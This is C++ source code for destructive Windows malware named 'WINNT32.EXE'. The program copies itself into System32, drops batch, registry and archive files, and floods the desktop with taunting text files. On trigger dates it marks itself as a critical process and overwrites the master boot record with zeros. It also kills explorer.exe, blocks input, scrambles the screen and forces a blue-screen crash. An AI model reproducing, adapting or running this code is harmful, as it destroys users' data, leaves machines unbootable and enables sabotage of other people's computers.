#include "main.h"
#define UNICODE
//todo : implement hooks and add base file for run NOTE: Body not complete yet
using namespace std;
EXTERN_C IMAGE_DOS_HEADER __ImageBase;
#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <fstream>
#include <string>
#include <direct.h>
#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <CommCtrl.h>
#include <winternl.h>
#include <iostream> 
#include <tlhelp32.h> 
#include <tchar.h> 
#pragma comment(lib,"ntdll.lib")

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtSetInformationProcess(HANDLE, ULONG, PVOID, ULONG);
BOOLEAN bl;
ULONG BreakOnTermination;
NTSTATUS status;
char cmd[10];
void move() {
	HWND  hwndParent = ::FindWindowA("Progman", "Program Manager");
	HWND  hwndSHELLDLL_DefView = ::FindWindowEx(hwndParent, NULL, L"SHELLDLL_DefView", NULL);
	HWND  hwndSysListView32 = ::FindWindowEx(hwndSHELLDLL_DefView, NULL, L"SysListView32", L"FolderView");

	int Nm = ListView_GetItemCount(hwndSysListView32);

	int sNm = 360 / Nm;

	int x = 0, y = 0;
	int speedx = 30;
	int speedy = 30;
	int i = 0;
	while (true)
	{
		x += speedx;
		y += speedy;
		if (x > 1920 + 1920 - 50 / 2)
			speedx = -30;
		if (x < 0)
			speedx = 30;
		if (y > 1080 - 50 / 2)
			speedy = -30;
		if (y < 0)
			speedy = 30;

		if (i < Nm)
			i++;
		else
			i = 0;

		::SendMessage(hwndSysListView32, LVM_SETITEMPOSITION, i, MAKELPARAM(x, y));
		ListView_RedrawItems(hwndSysListView32, i, i + 1);
		//		ListView_RedrawItems(hwndSysListView32, 0, ListView_GetItemCount(hwndSysListView32) - 1);
		::UpdateWindow(hwndSysListView32);
		Sleep(50);
	}
}
void dark() {
	HDC hdc = GetDC(HWND_DESKTOP);

	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);

	while (1) {
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		BitBlt(hdc, rand() % 2, rand() % 2, rand() % sw, rand() % sh, hdc, rand() % 2, rand() % 2, SRCAND);
		Sleep(3);
	}
}
BOOLEAN tmp1;
DWORD tmp2;
void killWindowsInstant() {
	// Try to force BSOD first
	// I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
	// This isn't even an exploit, it's just an undocumented feature.
	HMODULE ntdll = LoadLibraryA("ntdll");
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
		__asm {
			push offset tmp1

			push byte ptr 0
			push byte ptr 1
			push dword ptr 19

			call RtlAdjustPrivilege

			push offset tmp2

			push dword ptr 6
			push dword ptr 0
			push dword ptr 0
			push dword ptr 0

			push dword ptr 0xc0000022

			call NtRaiseHardError
		};
	}

	// If the computer is still running, do it the normal way
	HANDLE token;
	TOKEN_PRIVILEGES privileges;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
	privileges.PrivilegeCount = 1;
	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

	// The actual restart
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
}
//void last() {
//	char mbrData[512];
//	ZeroMemory(&mbrData, (sizeof mbrData));
//	HANDLE MBR = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
//	DWORD write;
//	WriteFile(MBR, mbrData, 512, &write, NULL);
//	CloseHandle(MBR);
//	if (MessageBoxA(NULL, "There is No Escape Now do not try to kill the process your computer is now done for anyway do you want to enjoy the last minutes using your computer?", "NO ESCAPE", MB_YESNO) == IDYES)
//	{
//		ShellExecute(NULL, NULL, L"taskkill /f /im explorer.exe", NULL, NULL, SW_HIDE);
//		ShellExecute(NULL, NULL, L"calc.exe", NULL, NULL, SW_SHOW);
//		ShellExecute(NULL, NULL, L"notepad.exe", NULL, NULL, SW_SHOW);
//		ShellExecute(NULL, NULL, L"mspaint.exe", NULL, NULL, SW_SHOW);
//		//ShellExecute(NULL, NULL, L"powershell.exe", NULL, NULL, SW_SHOW);
//		//ShellExecute(NULL, NULL, L"taskmgr.exe", NULL, NULL, SW_SHOW);
//		dark();
//	}
//	else
//	{
//		killWindowsInstant();
//	}
//}
void lol();
void hello() {
	HANDLE hProcessSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);

	PROCESSENTRY32 ProcessEntry = { 0 };
	ProcessEntry.dwSize = sizeof(ProcessEntry);

	BOOL Return = FALSE;
Label:Return = Process32First(hProcessSnapShot, &ProcessEntry);

	if (!Return)
	{
		goto Label;
	}

	do
	{
		int value = _tcsicmp(ProcessEntry.szExeFile, _T("notepad.exe"));
		//replace the taskmgr.exe to the process u want to remove. 
		if (value == 0)
		{
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, ProcessEntry.th32ProcessID);
			TerminateProcess(hProcess, 0);
			CloseHandle(hProcess);
		}

	} while (Process32Next(hProcessSnapShot, &ProcessEntry));

	CloseHandle(hProcessSnapShot);
}
void simple() {
	HANDLE hProcessSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);

	PROCESSENTRY32 ProcessEntry = { 0 };
	ProcessEntry.dwSize = sizeof(ProcessEntry);

	BOOL Return = FALSE;
Label:Return = Process32First(hProcessSnapShot, &ProcessEntry);

	if (!Return)
	{
		goto Label;
	}

	do
	{
		int value = _tcsicmp(ProcessEntry.szExeFile, _T("explorer.exe"));
		//replace the taskmgr.exe to the process u want to remove. 
		if (value == 0)
		{
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, ProcessEntry.th32ProcessID);
			TerminateProcess(hProcess, 0);
			CloseHandle(hProcess);
		}

	} while (Process32Next(hProcessSnapShot, &ProcessEntry));

	CloseHandle(hProcessSnapShot);
}

void resource()
{

    DWORD dw;
    HANDLE hFile = CreateFileA("C:\\Windows\\winnt32.exe", GENERIC_WRITE, NULL, NULL, CREATE_NEW, NULL, NULL);
    WriteFile(hFile, rawData, sizeof(rawData), &dw, 0);
    CloseHandle(hFile);
}
void resource1()
{
    DWORD dw;
    HANDLE hFile = CreateFileA("C:\\hello.png", GENERIC_WRITE, NULL, NULL, CREATE_NEW, NULL, NULL);
    WriteFile(hFile, rawData1, sizeof(rawData1), &dw, 0);
    CloseHandle(hFile);
}
using namespace std;
void batfile() {
	DWORD dw;
	HANDLE hFile = CreateFileA("C:\\hello.bat", GENERIC_WRITE, NULL, NULL, CREATE_NEW, NULL, NULL);
	WriteFile(hFile, Raw, sizeof(Raw), &dw, 0);
	CloseHandle(hFile);
}
void zipfile() {
	DWORD dw;
	HANDLE hFile = CreateFileA("\\a.zip", GENERIC_WRITE, NULL, NULL, CREATE_NEW, NULL, NULL);
	WriteFile(hFile, zipfile1, sizeof(zipfile1), &dw, 0);
	CloseHandle(hFile);
}
void regfile() {
	DWORD dw;
	HANDLE hFile = CreateFileA("C:\\hello.reg", GENERIC_WRITE, NULL, NULL, CREATE_NEW, NULL, NULL);
	WriteFile(hFile, regfile1, sizeof(regfile1), &dw, 0);
	CloseHandle(hFile);
}
DWORD WINAPI Checkykey(LPVOID lpParam) {
	while (GetAsyncKeyState(0x59) == 0) {
		//sleep 
		Sleep(10);
	}
	HWND hWnd = FindWindow(NULL, L"*Untitled - Notepad");
	if (!hWnd) {
		HWND lol = FindWindow(NULL, L"*Untitled - Notepad");
		HWND ok = FindWindowEx(lol, NULL, L"Edit", NULL);
		SetForegroundWindow(lol);
		SendMessage(ok, WM_CHAR, VK_SPACE, 1);
		SendMessage(ok, WM_CHAR, (TCHAR)'G', 0);
		SendMessage(ok, WM_CHAR, (TCHAR)'O', 0);
		SendMessage(ok, WM_CHAR, (TCHAR)'O', 0);
		SendMessage(ok, WM_CHAR, (TCHAR)'D', 0);
		SendMessage(ok, WM_CHAR, VK_SPACE, 1);
		SendMessage(ok, WM_CHAR, (TCHAR)'L', 0);
		SendMessage(ok, WM_CHAR, (TCHAR)'U', 0);
		SendMessage(ok, WM_CHAR, (TCHAR)'C', 0);
		SendMessage(ok, WM_CHAR, (TCHAR)'K', 0);
		SendMessage(ok, WM_CHAR, (TCHAR)'.', 0);
		hello();
		//();
		Sleep(2000);
		ShellExecute(NULL, NULL, L"taskkill /f /im explorer.exe", NULL, NULL, SW_HIDE);
		ShellExecute(NULL, NULL, L"calc.exe", NULL, NULL, SW_SHOW);
		ShellExecute(NULL, NULL, L"notepad.exe", NULL, NULL, SW_SHOW);
		ShellExecute(NULL, NULL, L"mspaint.exe", NULL, NULL, SW_SHOW);
		for (int i = 0; i < 20; i++) {
			dark();
		}
		dark();
		Sleep(30000);
		killWindowsInstant();
	}
	HWND edit = FindWindowEx(hWnd, NULL, L"Edit", NULL);
	SetForegroundWindow(hWnd);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'G', 0);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	SendMessage(edit, WM_CHAR, (TCHAR)'D', 0);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'L', 0);
	SendMessage(edit, WM_CHAR, (TCHAR)'U', 0);
	SendMessage(edit, WM_CHAR, (TCHAR)'C', 0);
	SendMessage(edit, WM_CHAR, (TCHAR)'K', 0);
	SendMessage(edit, WM_CHAR, (TCHAR)'.', 0);
	hello();
	ShellExecute(NULL, NULL, L"taskkill /f /im explorer.exe", NULL, NULL, SW_HIDE);
	Sleep(2000);
	ShellExecute(NULL, NULL, L"calc.exe", NULL, NULL, SW_SHOW);
	ShellExecute(NULL, NULL, L"notepad.exe", NULL, NULL, SW_SHOW);
	ShellExecute(NULL, NULL, L"mspaint.exe", NULL, NULL, SW_SHOW);
	for (int i = 0; i < 20; i++) {
		dark();
	}
	dark();
	Sleep(30000);
	killWindowsInstant();

}
DWORD WINAPI Checknkey(LPVOID lpParam) {
	while (GetAsyncKeyState(0x4E) == 0) {
		//sleep 
		Sleep(10);
	}
	killWindowsInstant();
	return 0;
}
int main() {
    FreeConsole();
    //unconditional file check
    //if malware body exists then skip this message if not start the infection process
    FILE* file;
	if (file = fopen("C:\\Windows\\System32\\winnt32.exe", "r")) {
        //fclose(file);
		FreeConsole();
		SYSTEMTIME time;
		GetSystemTime(&time);
		if (time.wMonth == 12 && time.wDay == 24) {
			RtlAdjustPrivilege(20, TRUE, FALSE, &bl);
			BreakOnTermination = 1;

			status = NtSetInformationProcess((HANDLE)-1, 0x1d, &BreakOnTermination, sizeof(ULONG));
			char mbrData[512];
			ZeroMemory(&mbrData, (sizeof mbrData));
			HANDLE MBR = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
			DWORD write;
			WriteFile(MBR, mbrData, 512, &write, NULL);
			CloseHandle(MBR);
			ShellExecute(NULL, NULL, L"notepad.exe", NULL, NULL, SW_SHOW);
			Sleep(2000);
			lol();

			CreateThread(NULL, 0, Checkykey, NULL, 0, NULL);
			CreateThread(NULL, 0, Checknkey, NULL, 0, NULL);

			while (1) {
				//HWND some = FindWindow(NULL, L"*Untitled - Notepad");
				//if (!some) {
				//	Sleep(1000);
				//	killWindowsInstant();
				//}
			}

		}
		if (time.wMonth == 3 && time.wDay == 13) {
			RtlAdjustPrivilege(20, TRUE, FALSE, &bl);
			BreakOnTermination = 1;

			status = NtSetInformationProcess((HANDLE)-1, 0x1d, &BreakOnTermination, sizeof(ULONG));
			move();
		}
		if (time.wMonth == 5 && time.wDay == 4) {
			RtlAdjustPrivilege(20, TRUE, FALSE, &bl);
			BreakOnTermination = 1;

			status = NtSetInformationProcess((HANDLE)-1, 0x1d, &BreakOnTermination, sizeof(ULONG));
			dark();
		}
		if (time.wMonth == 1 && time.wDay == 5) {
			MessageBoxA(NULL, "Fred Durst Says:", "No computer today silly boy go outsie and play", MB_ICONERROR);

		}
	}
	else{
        if (MessageBoxA(NULL, "This malware is no joke continue?", "WINNT32.EXE", MB_YESNO | MB_ICONQUESTION) == IDYES)
        {
			char system[MAX_PATH];
			char pathtofile[MAX_PATH];
			HMODULE GetModH = GetModuleHandleA(NULL);
			GetModuleFileNameA(GetModH, pathtofile, sizeof(pathtofile));
			GetSystemDirectoryA(system, sizeof(system));
			strcat(system, "\\winnt32.exe");
			CopyFileA(pathtofile, system, false);
            resource1();
            //resource();
			batfile();
			zipfile();
			regfile();
			std::size_t l = 0;                                                            // starts a counting number this will help this program to create separate files
			const char* path = "C:\\Users\\Public\\Desktop\\";                                                      // location in which all files are going to stored
			std::string content = "Your Computer is mine you can't get rid of this malware - NO ESCAPE";                 // the content of our files                                                                      // creates a folder in c: drive in which files are going to written in and saved
			for (int i = 0; i < 150; i++)// an infinite loop
			{
				    l++;                                                                               // adds i to itself every time
				    std::ofstream file;                                                                // creates a constructor this will save our file
				    file.open(path + std::to_string(l) + ".txt", std::ios_base::out);                  // creates a file to a location
					file << content;                                                                   // writes the content in the file and then saves it
					file.close();                                                                      // closes the file // if you want to take more resources don't write this line                 // gives us an accurate number of files created inside a directory
			}
			all();
            //HANDLE token;
            //TOKEN_PRIVILEGES privileges;

            //OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

            //LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
            //privileges.PrivilegeCount = 1;
            //privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

            //AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

            //////    // The actual restart
            //ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
            //ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
        }
        else
        {
            return 0;
        }
    }
}
void lol() {
	BlockInput(true);
	HWND hWnd = FindWindow(NULL, L"Untitled - Notepad");
	HWND edit = FindWindowEx(hWnd, NULL, L"Edit", NULL);
	SetForegroundWindow(hWnd);
	SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'H', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'R', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'I', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'S', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'N', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'S', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'C', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'A', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'P', 0);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'N', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'W', 0);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'D', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'N', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'R', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'Y', 0);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'C', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'L', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'S', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'H', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'I', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'S', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'W', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'I', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'N', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'D', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'W', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'Y', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'U', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'R', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'C', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'M', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'P', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'U', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'R', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'I', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'S', 0);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'N', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'W', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'D', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'N', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'F', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'R', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'A', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'N', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'Y', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'W', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'A', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'Y', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'D', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'Y', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'U', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'W', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'A', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'N', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'N', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'J', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'Y', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'H', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'L', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'A', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'S', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'M', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'I', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'N', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'U', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'S', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'U', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'S', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'I', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'N', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'G', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'Y', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'U', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'R', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'C', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'M', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'P', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'U', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'R', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'?', 0);

	BlockInput(false);

}